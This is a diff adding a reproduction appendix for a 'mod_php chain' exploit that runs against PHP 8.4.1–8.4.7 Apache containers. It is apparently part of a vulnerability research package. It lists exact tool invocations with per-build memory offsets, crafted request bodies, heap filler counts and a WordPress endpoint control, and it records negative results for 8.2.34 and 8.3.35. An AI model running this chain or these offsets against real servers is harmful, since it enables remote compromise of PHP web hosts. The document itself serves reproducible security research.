@@ -1,0 +1,185 @@
+# Exact commands — 2026-10-26 mod_php chain rerun
+#
+# Placeholders used for publication:
+#   <RUNDIR>      private scratch run root (not shipped)
+#   <PORT>        free loopback port      <container>   disposable container name
+#   <WP_TREE>     a WordPress tree, read-only
+# Everything below is the command as executed apart from those substitutions.
+
+## 0. Quick start (one build)
+
+```bash
+mkdir -p <RUNDIR>/bodies
+xz -dc bodies/a1_early.bin.xz > <RUNDIR>/bodies/a1_early.bin
+xz -dc bodies/b1_early.bin.xz > <RUNDIR>/bodies/b1_early.bin
+mkdir -p <RUNDIR>/run/841/{conf,www,logs,out}
+cp php-8.4.1/evidence/config/php.ini            <RUNDIR>/run/841/conf/
+cp php-8.4.1/evidence/docroot/index.php         <RUNDIR>/run/841/www/
+bash tools/setup_build.sh 8.4.1 <PORT> <container> <RUNDIR>/run/841
+python3 tools/chain_early.py --container <container> --port <PORT> \
+  --tag PR841B --build 8.4.1 --zdtor 0x628c40 --zif 0x4397c0 --soff 0xED398 \
+  --a1 <RUNDIR>/bodies/a1_early.bin --b1 <RUNDIR>/bodies/b1_early.bin --fillers 115 \
+  --outdir <RUNDIR>/run/841/out --logdir <RUNDIR>/run/841/logs --restart
+```
+
+`--restart` restarts the container before the run (fresh ASLR); omit it for the first run.
+
+## 1. Images (pulled, digest-pinned by tag)
+
+```bash
+docker pull php:8.4.1-apache       # php@sha256:204de2d31416e176774b98217beb8e078a9f3b55306b370d6a9f1f470af5f306
+docker pull php:8.4.2-apache       # php@sha256:4a848a54b2395db7cae149c89f51dfa9050c941f91e7e29fd49ca3b901c21ff5
+docker pull php:8.4.3-apache       # php@sha256:2e991f7a700e87d88a3dfac072994d25e00358e6fc989165fa5a8756ce9bf588
+docker pull php:8.4.4-apache       # php@sha256:bb2864e94951e980a3e9217f89b3820dc115f6c5cfff051c20428e0688552de7
+docker pull php:8.4.5-apache       # php@sha256:56a121dbe0a1f2dfd20b24d28408a0ec67c2e480b59a41d4c6c012870984bea6
+docker pull php:8.4.6-apache       # php@sha256:7d3db049ab53faf1587b1677c6e4a11cc4239677c9a945a554709f709d4b81b6
+docker pull php:8.4.7-apache       # php@sha256:6b0e0ad94d91b919902dc541fe6a89d37fcb55debb2e7d1b90554480fc301c44
+docker pull php:8.2.34-apache      # php@sha256:1650dcb528360aad05d6ed2f83cb403a2a39c31bd14552efd9a747b2207dea86
+docker pull php:8.3.35-apache      # php@sha256:c59c808172ee3672cd334f8f2a5d7b1480a9d7273a368f412b8ee9b4ef418184
+```
+
+Measured at run time: PHP 8.4.1–8.4.7 images ship Apache 2.4.62 (Debian); 8.2.34/8.3.35 ship Apache 2.4.69.
+
+## 2. Setup + chain, per build
+
+### 8.4.1
+
+```bash
+bash tools/setup_build.sh 8.4.1 <PORT> <container> <RUNDIR>/run/841
+python3 tools/chain_early.py --container <container> --port <PORT> \
+  --tag PR841B --build 8.4.1 --zdtor 0x628c40 --zif 0x4397c0 --soff 0xED398 \
+  --a1 <RUNDIR>/bodies/a1_early.bin --b1 <RUNDIR>/bodies/b1_early.bin --fillers 115 \
+  --outdir <RUNDIR>/run/841/out --logdir <RUNDIR>/run/841/logs --restart
+```
+
+Run A of this build used tag `PR841A` and `--outdir .../out` on the fresh container (no `--restart`); run C used tag `PR841C`, `--outdir .../outC --restart`.
+
+### 8.4.2
+
+```bash
+bash tools/setup_build.sh 8.4.2 <PORT> <container> <RUNDIR>/run/842
+python3 tools/chain_early.py --container <container> --port <PORT> \
+  --tag PR842B --build 8.4.2 --zdtor 0x628ea0 --zif 0x4398b0 --soff 0xED398 \
+  --a1 <RUNDIR>/bodies/a1_early.bin --b1 <RUNDIR>/bodies/b1_early.bin --fillers 115 \
+  --outdir <RUNDIR>/run/842/out --logdir <RUNDIR>/run/842/logs --restart
+```
+
+Run A of this build used tag `PR842A` and `--outdir .../out` on the fresh container (no `--restart`); run C used tag `PR842C`, `--outdir .../outC --restart`.
+
+### 8.4.3
+
+```bash
+bash tools/setup_build.sh 8.4.3 <PORT> <container> <RUNDIR>/run/843
+python3 tools/chain_early.py --container <container> --port <PORT> \
+  --tag PR843B --build 8.4.3 --zdtor 0x629e20 --zif 0x439bb0 --soff 0xED398 \
+  --a1 <RUNDIR>/bodies/a1_early.bin --b1 <RUNDIR>/bodies/b1_early.bin --fillers 115 \
+  --outdir <RUNDIR>/run/843/out --logdir <RUNDIR>/run/843/logs --restart
+```
+
+Run A of this build used tag `PR843A` and `--outdir .../out` on the fresh container (no `--restart`); run C used tag `PR843C`, `--outdir .../outC --restart`.
+
+### 8.4.4
+
+```bash
+bash tools/setup_build.sh 8.4.4 <PORT> <container> <RUNDIR>/run/844
+python3 tools/chain_early.py --container <container> --port <PORT> \
+  --tag PR844B --build 8.4.4 --zdtor 0x62ac70 --zif 0x43a650 --soff 0xED398 \
+  --a1 <RUNDIR>/bodies/a1_early.bin --b1 <RUNDIR>/bodies/b1_early.bin --fillers 115 \
+  --outdir <RUNDIR>/run/844/out --logdir <RUNDIR>/run/844/logs --restart
+```
+
+Run A of this build used tag `PR844A` and `--outdir .../out` on the fresh container (no `--restart`); run C used tag `PR844C`, `--outdir .../outC --restart`.
+
+### 8.4.5
+
+```bash
+bash tools/setup_build.sh 8.4.5 <PORT> <container> <RUNDIR>/run/845
+python3 tools/chain_early.py --container <container> --port <PORT> \
+  --tag PR845B --build 8.4.5 --zdtor 0x62c420 --zif 0x43b660 --soff 0xED398 \
+  --a1 <RUNDIR>/bodies/a1_early.bin --b1 <RUNDIR>/bodies/b1_early.bin --fillers 115 \
+  --outdir <RUNDIR>/run/845/out --logdir <RUNDIR>/run/845/logs --restart
+```
+
+Run A of this build used tag `PR845A` and `--outdir .../out` on the fresh container (no `--restart`); run C used tag `PR845C`, `--outdir .../outC --restart`.
+
+### 8.4.6
+
+```bash
+bash tools/setup_build.sh 8.4.6 <PORT> <container> <RUNDIR>/run/846
+python3 tools/chain_early.py --container <container> --port <PORT> \
+  --tag PR846B --build 8.4.6 --zdtor 0x62ca40 --zif 0x43b940 --soff 0xED398 \
+  --a1 <RUNDIR>/bodies/a1_early.bin --b1 <RUNDIR>/bodies/b1_early.bin --fillers 115 \
+  --outdir <RUNDIR>/run/846/out --logdir <RUNDIR>/run/846/logs --restart
+```
+
+Run A of this build used tag `PR846A` and `--outdir .../out` on the fresh container (no `--restart`); run C used tag `PR846C`, `--outdir .../outC --restart`.
+
+### 8.4.7
+
+```bash
+bash tools/setup_build.sh 8.4.7 <PORT> <container> <RUNDIR>/run/847
+python3 tools/chain_early.py --container <container> --port <PORT> \
+  --tag PR847B --build 8.4.7 --zdtor 0x62cd60 --zif 0x43b920 --soff 0xED398 \
+  --a1 <RUNDIR>/bodies/a1_early.bin --b1 <RUNDIR>/bodies/b1_early.bin --fillers 115 \
+  --outdir <RUNDIR>/run/847/out --logdir <RUNDIR>/run/847/logs --restart
+```
+
+Run A of this build used tag `PR847A` and `--outdir .../out` on the fresh container (no `--restart`); run C used tag `PR847C`, `--outdir .../outC --restart`.
+
+## 3. WordPress endpoint control (8.4.1 only)
+
+```bash
+mkdir -p <RUNDIR>/run/841wp/{conf,logs,out}
+cp php-8.4.1/evidence/config/*.conf <RUNDIR>/run/841wp/conf/
+cp php-8.4.1/evidence/config/php.ini <RUNDIR>/run/841wp/conf/
+chmod 777 <RUNDIR>/run/841wp/logs
+docker run -d --name <container> -p 127.0.0.1:<PORT>:80 \
+  -v <RUNDIR>/run/841wp/conf/php.ini:/usr/local/etc/php/php.ini:ro \
+  -v <RUNDIR>/run/841wp/conf/000-default-p2s.conf:/etc/apache2/sites-enabled/000-default.conf:ro \
+  -v <RUNDIR>/run/841wp/conf/zz-p2s.conf:/etc/apache2/conf-enabled/zz-p2s.conf:ro \
+  -v <WP_TREE>:/var/www/html:ro \
+  -v <RUNDIR>/run/841wp/logs:/var/log/apache2 php:8.4.1-apache
+python3 tools/chain_early.py --container <container> --port <PORT> \
+  --tag PR841WP --build 8.4.1 --zdtor 0x628c40 --zif 0x4397c0 --soff 0xED398 \
+  --a1 <RUNDIR>/bodies/a1_early.bin --b1 <RUNDIR>/bodies/b1_early.bin --fillers 115 \
+  --outdir <RUNDIR>/run/841wp/out --logdir <RUNDIR>/run/841wp/logs \
+  --path /wp-content/index.php
+```
+
+The control tree was WordPress `7.2-beta1-64694`; `/wp-content/index.php` is the 28-byte core silence file (md5 `67442c5615eba73d105c0715c6620850`).
+
+## 4. 8.2.34 / 8.3.35 attempt (negative result in this tree)
+
+```bash
+bash tools/setup_build.sh 8.2.34 <PORT> <container> <RUNDIR>/run/8234
+python3 tools/chain_early.py --container <container> --port <PORT> \
+  --tag PR8234A --build 8.2.34 --zdtor 0x487650 --zif 0x39b8a0 --soff 0xED398 \
+  --a1 <RUNDIR>/bodies/a1_early.bin --b1 <RUNDIR>/bodies/b1_early.bin --fillers 115 \
+  --outdir <RUNDIR>/run/8234/out --logdir <RUNDIR>/run/8234/logs
+
+bash tools/setup_build.sh 8.3.35 <PORT> <container> <RUNDIR>/run/8335
+python3 tools/chain_early.py --container <container> --port <PORT> \
+  --tag PR8335A --build 8.3.35 --zdtor 0x49ec50 --zif 0x3ac080 --soff 0xED398 \
+  --a1 <RUNDIR>/bodies/a1_early.bin --b1 <RUNDIR>/bodies/b1_early.bin --fillers 115 \
+  --outdir <RUNDIR>/run/8335/out --logdir <RUNDIR>/run/8335/logs
+
+```
+
+These two commands reproduce the **negative** records: A1 reaches only the parse-time OOM and B1 returns no pointers. `--soff 0xED398` is the driver default and was never reached; the `S` anchor for 8.2.34/8.3.35 has not been measured.
+
+## 5. Verification
+
+```bash
+sha256sum -c sha256sums.txt
+python3 tools/verify_receipts.py
+```
+
+## 6. Body regeneration
+
+```bash
+python3 tools/mk_a1x.py --out a1_early.bin --parts 860 --big 85 --tailk2 16 --tailk 14
+sha256sum a1_early.bin   # 30cb2a107121967741e89bb5b84c34d13d0f7cf3c8af26721998bc213b8fe174
+xz -dc bodies/b1_early.bin.xz | sha256sum   # 9edef7cc1a9bff5140135bef0296b7ed7ef356f8362d0bc4f5e5769833d5a7fa
+```
+
+The B1 body is only available as the compressed artifact; its generator (`mk_leak_b2.py` from the original lab) was not preserved. A2 and B2 are generated inside `tools/chain_early.py` from `tools/pure/`.
